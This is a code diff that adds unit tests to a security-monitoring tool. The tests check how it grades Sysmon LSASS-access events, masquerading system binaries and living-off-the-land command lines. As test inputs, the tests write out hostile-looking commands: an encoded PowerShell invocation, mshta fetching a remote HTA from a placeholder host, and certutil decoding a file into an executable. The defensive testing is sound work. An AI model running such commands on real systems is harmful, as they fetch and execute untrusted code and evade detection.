@@ -1,4 +1,5 @@
 import { describe, it, expect, afterEach } from "vitest";
+import { isTrustedSystemImage } from "../../src/analysis/winProcessBaseline.js";
 import {
   parseSiemExport,
   extractRecords,
@@ -407,6 +408,58 @@ describe("parseSiemExport — Windows Event Log mapping", () => {
     expect(r.events[0].mitreTechniques).toContain("T1003.001");
   });
 
+  it("flags a system NAME running from a non-system path, even one SUSP_PATH does not list", () => {
+    // C:\Windows\ is neither System32 nor a staging directory, so the name alone used to carry the
+    // whole downgrade — the classic DLL-hijack / side-loading drop.
+    const hijack = {
+      "@timestamp": "2024-03-18T10:03:00Z",
+      log_name: "Microsoft-Windows-Sysmon/Operational",
+      computer_name: "WS1",
+      event_id: 10,
+      event_data: {
+        SourceImage: "C:\\Windows\\svchost.exe",
+        TargetImage: "C:\\Windows\\System32\\lsass.exe",
+        GrantedAccess: "0x1410",
+      },
+    };
+    const r = parseSiemExport(elastic(hijack));
+    expect(r.events[0].severity).toBe("High");
+    expect(r.events[0].mitreTechniques).toContain("T1003.001");
+  });
+
+  it("still downgrades a benign accessor whose feed normalized the path separator", () => {
+    const slashes = {
+      "@timestamp": "2024-03-18T10:05:00Z",
+      log_name: "Microsoft-Windows-Sysmon/Operational",
+      computer_name: "WS1",
+      event_id: 10,
+      event_data: {
+        SourceImage: "C:/Windows/System32/svchost.exe",
+        TargetImage: "C:/Windows/System32/lsass.exe",
+        GrantedAccess: "0x1010",
+      },
+    };
+    const r = parseSiemExport(elastic(slashes));
+    expect(r.events[0].severity).toBe("Low");
+    expect(r.events[0].mitreTechniques).not.toContain("T1003.001");
+  });
+
+  it("still downgrades a benign accessor a feed reported by basename only", () => {
+    const bare = {
+      "@timestamp": "2024-03-18T10:04:00Z",
+      log_name: "Microsoft-Windows-Sysmon/Operational",
+      computer_name: "WS1",
+      event_id: 10,
+      event_data: {
+        SourceImage: "MsMpEng.exe",
+        TargetImage: "C:\\Windows\\System32\\lsass.exe",
+        GrantedAccess: "0x1010",
+      },
+    };
+    const r = parseSiemExport(elastic(bare));
+    expect(r.events[0].severity).toBe("Low");
+  });
+
   it("grades a renamed LSASS dumper (by argument) as High — #199", () => {
     const dump = {
       "@timestamp": "2024-03-18T15:24:38Z",
@@ -586,6 +639,83 @@ describe("isSuspiciousCmd — #199 tradecraft grading", () => {
   it("null: benign system binary running a benign command", () => {
     expect(isSuspiciousCmd("C:\\Windows\\System32\\whoami.exe", "whoami /all")).toBe(null);
     expect(isSuspiciousCmd("/usr/bin/id", "id")).toBe(null);
+  });
+
+  // An EVERYDAY LOLBin name is not a verdict. cmd.exe and powershell.exe run continuously on a
+  // healthy managed endpoint, so grading them Medium on the image alone put thousands of benign
+  // process creations above the forensic gate and buried the rare real one.
+  it("null: an everyday LOLBin with an ordinary command line", () => {
+    expect(isSuspiciousCmd("C:\\Windows\\System32\\cmd.exe", "cmd.exe /c dir C:\\Reports")).toBe(null);
+    expect(
+      isSuspiciousCmd(
+        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "powershell.exe -File C:\\Scripts\\Inventory.ps1",
+      ),
+    ).toBe(null);
+    expect(isSuspiciousCmd("C:\\Windows\\System32\\net.exe", "net use Z: \\\\fs01\\share")).toBe(null);
+    expect(isSuspiciousCmd("C:\\Windows\\System32\\msiexec.exe", "msiexec.exe /i app.msi /qn")).toBe(null);
+  });
+
+  it("weak: the SAME everyday LOLBin once the command line carries a signal", () => {
+    expect(isSuspiciousCmd("C:\\Windows\\System32\\cmd.exe", "cmd.exe /c powershell -enc SQBFAFgA")).toBe(
+      "weak",
+    );
+    expect(isSuspiciousCmd("C:\\Windows\\Temp\\cmd.exe", "cmd.exe /c dir")).toBe("weak");
+  });
+
+  it("weak: an UNCOMMON LOLBin still grades on the image alone", () => {
+    expect(isSuspiciousCmd("C:\\Windows\\System32\\mshta.exe", "mshta.exe https://x.example/a.hta")).toBe(
+      "weak",
+    );
+    expect(isSuspiciousCmd("C:\\Windows\\System32\\certutil.exe", "certutil.exe -decode a.txt b.exe")).toBe(
+      "weak",
+    );
+    expect(isSuspiciousCmd("C:\\Windows\\System32\\installutil.exe", "installutil.exe /u x.dll")).toBe(
+      "weak",
+    );
+  });
+});
+
+// The benign-source sets are keyed on the image BASENAME, which is the one thing an attacker gets
+// for free. SUSP_PATH alone could not close that: it lists the STAGING directories, so a payload
+// named svchost.exe dropped somewhere it does not cover inherited the full downgrade.
+describe("isTrustedSystemImage — name-based trust needs the matching path (#198 follow-up)", () => {
+  it("trusts a system path", () => {
+    expect(isTrustedSystemImage("C:\\Windows\\System32\\svchost.exe")).toBe(true);
+    expect(isTrustedSystemImage("C:\\Windows\\System32\\wbem\\WmiPrvSE.exe")).toBe(true);
+    expect(isTrustedSystemImage("C:\\Windows\\SysWOW64\\svchost.exe")).toBe(true);
+    expect(
+      isTrustedSystemImage("C:\\Program Files\\Windows Defender Advanced Threat Protection\\MsSense.exe"),
+    ).toBe(true);
+    expect(
+      isTrustedSystemImage("C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18\\MsMpEng.exe"),
+    ).toBe(true);
+  });
+
+  it("does NOT trust a system NAME sitting outside a system path", () => {
+    expect(isTrustedSystemImage("C:\\Windows\\svchost.exe")).toBe(false); // the DLL-hijack drop
+    expect(isTrustedSystemImage("C:\\Users\\Public\\svchost.exe")).toBe(false);
+    expect(isTrustedSystemImage("D:\\Apps\\vendor\\csrss.exe")).toBe(false);
+  });
+
+  it("reads a forward-slash path as the same path — many SIEMs normalize the separator", () => {
+    // Both path regexes are written with backslashes. Without folding the separator first, every
+    // benign Defender / core-OS event on a normalizing feed failed the allowlist and was regraded.
+    expect(isTrustedSystemImage("C:/Windows/System32/svchost.exe")).toBe(true);
+    expect(isTrustedSystemImage("C:/ProgramData/Microsoft/Windows Defender/Platform/4.18/MsMpEng.exe")).toBe(
+      true,
+    );
+    // The mirror-image hole closes with it: a masquerade under C:/Users/Public/ used to slip past
+    // SUSP_PATH for exactly the same reason.
+    expect(isTrustedSystemImage("C:/Users/Public/svchost.exe")).toBe(false);
+    expect(isTrustedSystemImage("C:/Windows/svchost.exe")).toBe(false);
+  });
+
+  it("keeps name-based trust when the feed forwarded no path at all", () => {
+    // Tightening this case would regrade every Defender LSASS access on a basename-only feed as
+    // credential dumping — a worse trade than the masquerade the allowlist closes.
+    expect(isTrustedSystemImage("svchost.exe")).toBe(true);
+    expect(isTrustedSystemImage("")).toBe(true);
   });
 });
 
